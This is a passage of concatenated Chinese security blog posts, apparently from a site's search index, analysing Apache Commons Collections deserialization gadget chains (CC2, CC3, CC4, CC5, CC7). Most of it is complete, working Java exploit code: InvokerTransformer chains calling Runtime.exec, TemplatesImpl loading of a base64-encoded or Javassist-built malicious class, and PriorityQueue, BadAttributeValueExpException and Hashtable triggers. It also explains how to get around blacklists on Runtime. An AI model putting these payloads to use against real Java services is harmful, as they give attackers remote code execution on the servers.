这是怎么一回事呢？发现关键在AbstractMap的equals方法，在这里会进行判断，会判断value和m.get(key)返回的值一样不，由于我这里是new ConstantTransformer(1)所以最后返回的是1，不满足这个if条件，返回了true 然后返回true又有什么用，继续跟进： 也就是最开始调用的AbstractMapDecorator.equals会返回true，然后来到： 不难看到返回true满足if条件后并不会执行 addEntry 函数，所以这里也就没添加进去。 那么我们让AbstractMap的equals方法返回false就行了，所以构造 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); Map\u003cObject, Object\u003e Lazy1 = LazyMap.decorate(map1,cha); Lazy1.put(\"yy\",1); Map\u003cObject, Object\u003e Lazy2 = LazyMap.decorate(map2,new ConstantTransformer(2)); Lazy2.put(\"zZ\",1); Hashtable hashtable = new Hashtable(); has","date":"2024-06-29","objectID":"/posts/cc7/:1:5","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"CC7的hashcode 在上面计算hash调用了hashcode方法，那是不是可以和cc6一样，把key变为TiedMapEntry，然后触发到TiedMapEntry的hashcode方法。 构造poc： package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Hashtable; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC6test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap map2 = new HashMap(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map2,new ConstantTransformer(1)); Lazy.put(\"zZ\",1); TiedMapEntry tie = new TiedMapEntry(Lazy,\"aaa\"); Hashtable hashtable = new Hashtable(); hashtable.put(tie,1); Lazy.remove(\"aaa\"); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Field factoryField = lazyMapClass.getDeclaredField(\"factory\"); factoryField.setAccessible(true); factoryField.set(Lazy, cha); serilize(hashtable); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }","date":"2024-06-29","objectID":"/posts/cc7/:2:0","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"哈希碰撞底层分析 调试跟进到 hashcode 的最底层算法： for通过字符串长度来遍历字符的所有字母，然后进行计算，最开始是两个字母，这两个字母的hash又会轮下去影响后面的hash。 hash = 31 * val[i-1] + val[i]例如传入\"GRYS\" 那么计算其最开始的两个字母为 hash = 31 * 71 + 82可以构造其相等hash为 hash = 31 * 70 + 113也就是为\"Fq\"。后面是轮回运算，所以后面字母就不变了。 测试： 参考：https://nivi4.notion.site/Java-CommonCollections7-ef80bc3e4c1c47508a5762ac455a6cda 参考：https://blog.csdn.net/qq_35733751/article/details/119862728 参考：https://www.cnblogs.com/thebeastofwar/p/17842892.html ","date":"2024-06-29","objectID":"/posts/cc7/:3:0","tags":["java","反序列化"],"title":"CC7分析与利用","uri":"/posts/cc7/"},{"categories":["javasec"],"content":"CC4分析与利用 学了前面的cc2，其实cc4就是将cc2使用的InvokerTransformer替换成InstantiateTransformer来加载字节码（CC3里面有说）。 把最后调用的transform方法改为： Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tem}) }; ChainedTransformer cha = new ChainedTransformer(transformers);","date":"2024-06-28","objectID":"/posts/cc4-cc5/:0:0","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"poc package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ConstantTransformer; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.util.PriorityQueue; public class CC4 { public static void main(String[] args)throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{tem}) }; ChainedTransformer cha = new ChainedTransformer(transformers); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(1); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,new TransformingComparator(cha)); serilize(queue); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }CC5分析与利用 前面学习了cc6知道cc6是接着cc1的LazyMap.get向上走的，通过TiedMapEntry中的getValue调用get，在利用hashcode调用getValue，最后和URLDNS一样触发到hashcode。 ","date":"2024-06-28","objectID":"/posts/cc4-cc5/:1:0","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"分析 ","date":"2024-06-28","objectID":"/posts/cc4-cc5/:2:0","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"TiedMapEntry.toString 其实在TiedMapEntry类中还有toString也能调用getValue函数： 构造试试 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC5test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,cha); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); Tie.toString(); } }","date":"2024-06-28","objectID":"/posts/cc4-cc5/:2:1","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"BadAttributeValueExpException.readObject 那么接下来就是看哪里调用了toStirng方法，这个确实有点多不用找了，直接看ysoserial的cc4中给出了类BadAttributeValueExpException， 直接到了readObject方法，所以这里我们需要控制valObj为TiedMapEntry对象就行了。 发现valObj是通过gf.get方法获取的： 我们只需要将val类型变量赋值为TiedMapEntry对象即可 但发现其构造函数也会调用toString 所以为了解决这种提前触发，和前面链子的思路一样，先给val随便赋个值或者为null，然后在利用反射修改val为TiedMapEntry对象。 ","date":"2024-06-28","objectID":"/posts/cc4-cc5/:2:2","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"poc package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.BadAttributeValueExpException; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.*; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class CC5test { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject, Object\u003e Lazy = LazyMap.decorate(map,cha); TiedMapEntry Tie=new TiedMapEntry(Lazy,\"aaa\"); BadAttributeValueExpException val = new BadAttributeValueExpException(null); Field v = val.getClass().getDeclaredField(\"val\"); v.setAccessible(true); v.set(val, Tie); serilize(val); deserilize(\"111.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"111.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }","date":"2024-06-28","objectID":"/posts/cc4-cc5/:3:0","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"补充 发现BadAttributeValueExpException没有实现序列化接口，但还是能进行序列化， 这是因为BadAttributeValueExpException类继承了Exception类，Exception类又继承了Throwable类，而Throwable类实现了Serializable接口。 参考：https://nivi4.notion.site/Java-CommonCollections5-f8fd6a9220de46b7954664bb97109d9f 参考：https://www.cnblogs.com/1vxyz/p/17473581.html ","date":"2024-06-28","objectID":"/posts/cc4-cc5/:4:0","tags":["java","反序列化"],"title":"CC4+CC5分析与利用","uri":"/posts/cc4-cc5/"},{"categories":["javasec"],"content":"CC2分析与利用 ","date":"2024-06-27","objectID":"/posts/cc2/:0:0","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"环境配置 一、 CC2 需要使用commons-collections-4.0版本，因为3.1-3.2.1版本中TransformingComparator没有实现Serializable接口，不能被序列化，所以CC2不用3.x版本。还需要 javassist 依赖，利用链2需要。 pom.xml 添加： \u003cdependency\u003e \u003cgroupId\u003eorg.apache.commons\u003c/groupId\u003e \u003cartifactId\u003ecommons-collections4\u003c/artifactId\u003e \u003cversion\u003e4.0\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.javassist\u003c/groupId\u003e \u003cartifactId\u003ejavassist\u003c/artifactId\u003e \u003cversion\u003e3.29.2-GA\u003c/version\u003e \u003c/dependency\u003e二、 关于commons-collections-4.0： commons-collections-4.0不再认为是一个用来替换common-collection的新版本，而是一个新的包。两者的命名空间不冲突，可以共存在同一个项目中。所以在common-collection4-4.0下，依旧能利用common-collection-3.1的调用链，只是换了个包名而已。 关于Javassit： Javassist是一个开源的分析、编辑和创建Java字节码的类库，可以直接编辑和生成Java生成的字节码。能够在运行时定义新的Java类，在JVM加载类文件时修改类的定义。Javassist类库提供了两个层次的API，源代码层次和字节码层次。源代码层次的API能够以Java源代码的形式修改Java字节码。字节码层次的API能够直接编辑Java类文件 三、 环境： jdk8u71 commons-collections-4.0 ","date":"2024-06-27","objectID":"/posts/cc2/:1:0","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"利用链1分析 在ysoserial中给了链子，起点类是PriorityQueue.readObject()。 ","date":"2024-06-27","objectID":"/posts/cc2/:2:0","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"readObject() 知道调用链就直接正向分析吧，先看它的readObject函数： 调用了heapify函数，跟进： 看到当i\u003e=0时进入for循环，i=(size \u003e\u003e\u003e 1) -1将size进行了右移操作。继续调用了siftDown方法。 有个if条件，先不管，满足条件后调用了siftDownUsingComparator方法，跟进 看上面的利用链可以看到是利用了TransformingComparator类的compare方法（该类是commons-collections-4.0特有的）。这里我们需要用的是第二if中的compare方法，为什么不用第一个if中的呢？因为调试后面poc时就是走的第二个，猜测可能是不满足条件。 comparator就是一个接口，而TransformingComparator实现了该接口，所以我们这里要让comparator为TransformingComparator对象，就可以调用TransformingComparator的compare方法了，跟进重写的该方法： ","date":"2024-06-27","objectID":"/posts/cc2/:2:1","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"compare() 发现调用了transform方法，并且可以通过控制this.transformer来控制调用哪个对象的transform方法。 可以调用任意对象的transform方法了，剩下的就不用多说了。 链子： PriorityQueue.readObject() PriorityQueue.heapify() PriorityQueue.siftDown() PriorityQueue.siftDownUsingComparator() TransformingComparator.compare() InvokerTransformer.transform()","date":"2024-06-27","objectID":"/posts/cc2/:2:2","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"poc编写 先准备好PriorityQueue类和TransformingComparator类，PriorityQueue类构造函数： 在看看TransformingComparator的构造函数 我们调用的是第一个，然后第一个会调用第二个构造函数，我们只用传入我们需要执行transform方法的对象这个参数就行了。 所以先构造： package org.example; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import java.io.*; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); PriorityQueue queue = new PriorityQueue(1,new TransformingComparator(cha));问题一、heapify方法条件满足 执行后没有弹计算机，因为发现在执行heapify方法中，需要满足(size \u003e\u003e\u003e 1) - 1 ≥ 0，意思就是size\u003e2，这个可以通过add方法来向PriorityQueue对象中存放值，但是具体实现的还是offer函数： 构造poc： package org.example; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import java.io.*; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}), }; ChainedTransformer cha = new ChainedTransformer(transformers); PriorityQueue queue = new PriorityQueue(1,new TransformingComparator(cha)); queue.add(1); queue.add(1); serilize(pri); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } }这次成功弹计算机了，不过在反序列化的时候调试发现根本就没触发方法，看来是序列化的时候出问题了。后面看了师傅们的文章，发现是在add出的问题。 问题二、解决add提前触发 看见add调用offer方法的时候，会调用到sifUp方法，而这个方法又会直接调用到siftUpUsingComparator 导致执行compare提前弹出计算机。那么我们可以让comparator = null，让sifUp调用 siftUpComparable 方法，那里面没有compare方法。 PriorityQueue queue = new PriorityQueue(1);但待会还是得要 comparator，所以在 add 执行完后利用反射修改comparator为Tcomparator对象 Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,new TransformingComparator(cha));所以最终poc： package org.example; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args)throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTr","date":"2024-06-27","objectID":"/posts/cc2/:2:3","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"利用链2分析 在ysoserial的cc2中引入了 TemplatesImpl 类来进行承载攻击payload，需要用到 javassist，什么是 javassist， 参考：java Agent 学习于内存马，这里面有部分有介绍到。 看了师傅们的分析，这个利用链2无非就是把最后函数调用改为了利用temlatesimpl动态加载字节码来加载恶意类。 直接看到最后compare函数： 我们想要利用temlatesimpl动态加载字节码就需要调用TemplatesImpl.newTransformer()方法，所以这里this.transformer可以为InvokerTransformer，直接利用InvokerTransformer反射调用TemplatesImpl.newTransformer()（也可以结合cc3不用InvokerTransformer类，利用InstantiateTransformer类来实现调用）。 所以这里obj1参数得为TemplatgesImpl对象。向上朔源obj1也就是我们传入的queue[0]，待会可以利用反射给其赋值。 动态加载字节码不用多说了： TemplatesImpl tem =new TemplatesImpl(); byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); 只不过这里的byte[] code = Files.readAllBytes(Paths.get(\"D:/gaoren.class\")); 要更换一下，因为上面说了这里引入了Javassit依赖，这个依赖可以直接生成Java生成的字节码（感觉不如直接的class文件好用）。 利用Javassit依赖生成java的class字节码： String AbstractTranslet=\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"; ClassPool classPool=ClassPool.getDefault();//返回默认的类池 classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径 CtClass payload=classPool.makeClass(\"gaoren\");//创建一个新的public类 payload.setSuperclass(classPool.get(AbstractTranslet)); //设置前面创建的gaoren类的父类为AbstractTranslet payload.makeClassInitializer().setBody(\"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"); byte[] code = payload.toBytecode();反射设置queue[0]的值 Object[] queue_array = new Object[]{tem,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array);剩下的就没什么多说的了，从readObject打到compare方法的利用链和上面是一样的。 poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CC2 { public static void main(String[] args)throws Exception { String AbstractTranslet=\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"; ClassPool classPool=ClassPool.getDefault();//返回默认的类池 classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径 CtClass payload=classPool.makeClass(\"gaoren\");//创建一个新的public类 payload.setSuperclass(classPool.get(AbstractTranslet)); //设置前面创建的gaoren类的父类为AbstractTranslet payload.makeClassInitializer().setBody(\"java.lang.Runtime.getRuntime().exec(\\\"calc\\\");\"); //创建一个空的类初始化，设置构造函数主体为runtime TemplatesImpl tem =new TemplatesImpl(); byte[] code = payload.toBytecode(); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); InvokerTransformer inv = new InvokerTransformer(\"newTransformer\", null,null); PriorityQueue queue = new PriorityQueue(1); queue.add(1); queue.add(1); Field field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"comparator\"); field.setAccessible(true); field.set(queue,new TransformingComparator(inv)); Object[] queue_array = new Object[]{tem,1}; Field queue_field = Class.forName(\"java.util.PriorityQueue\").getDeclaredField(\"queue\"); queue_field.setAccessible(true); queue_field.set(queue,queue_array); serilize(queue); deserilize(\"ser.bin\"); } public static void serilize(Object obj)throws IOException { ObjectOutputStream out=new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); out.writeObject(obj); } public static Object deserilize(String Filename)throws IOException,ClassNotFoundException{ ObjectInputStream in=new ObjectInputStream(new FileInputStream(Filename)); Object obj=in.readObject(); return obj; } public static void setValue(Object ","date":"2024-06-27","objectID":"/posts/cc2/:3:0","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"参考 https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9 ","date":"2024-06-27","objectID":"/posts/cc2/:4:0","tags":["java","反序列化"],"title":"CC2分析与利用","uri":"/posts/cc2/"},{"categories":["javasec"],"content":"前面学了cc1和cc6都是通过调用 Runtime().getRuntime().exec() 来进行的命令执行，但很多时候服务器的代码当中的黑名单会选择禁用 Runtime 还有就是有些时候链子末尾没法反射调用恶意类。这时就可以在最后执行命令的时候变为动态加载字节码来进行恶意命令执行。 cc3其实就是cc1和Temlatesimpl动态加载字节码加了在一起。动态加载字节码参考[[../../java 安全基础/java动态加载字节码|../java基础/java动态加载字节码]] Temlatesimpl动态加载字节码的poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.util.Base64; public class CC3test { public static void main(String[] args) throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code=Base64.getDecoder().decode(\"yv66vgAAADQANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAITGdhb3JlbjsBAA1TdGFja01hcFRhYmxlBwArBwApAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAtnYW9yZW4uamF2YQwACQAKBwAuDAAvADABAARjYWxjDAAxADIBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAzAAoBAAZnYW9yZW4BAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAwABAAkACgABAAsAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAAwAAAAaAAYAAAAIAAQACgANAA0AEAALABEADAAVAA4ADQAAABYAAgARAAQADgAPAAEAAAAWABAAEQAAABIAAAAQAAL/ABAAAQcAEwABBwAUBAABABUAFgACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAEQANAAAAIAADAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABABkAGgACABsAAAAEAAEAHAABABUAHQACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAEwANAAAAKgAEAAAAAQAQABEAAAAAAAEAFwAYAAEAAAABAB4AHwACAAAAAQAgACEAAwAbAAAABAABABwAAQAiAAAAAgAj\"); setValue(tem, \"_bytecodes\", new byte[][]{code}); setValue(tem, \"_tfactory\", new TransformerFactoryImpl()); setValue(tem, \"_name\", \"gaoren\"); setValue(tem, \"_class\", null); tem.newTransformer(); } public static void setValue(Object obj,String fieldName,Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } }Temlatesimpl动态加载字节码的链子： TransformerImpl.getOutputProperties() TransformerImpl.newTransformer() TransformerImpl.getTransletInstance() TransformerImpl.defineTransletClasses() TransformerImpl.defineclass()","date":"2024-06-27","objectID":"/posts/cc3/:0:0","tags":["java","反序列化"],"title":"CC3分析与利用","uri":"/posts/cc3/"},{"categories":["javasec"],"content":"CC1+Temlatesimpl 这里动态加载字节码执行恶意命令一看就是放到最后的，所以现在只需要接着cc1的链子把最后transform反射调用Runtime.getruntime()变为反射调用TransformerImpl.newTransformer()， poc： package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class CC3test { public static void main(String[] args) throws Exception { TemplatesImpl tem =new TemplatesImpl(); byte[] code = 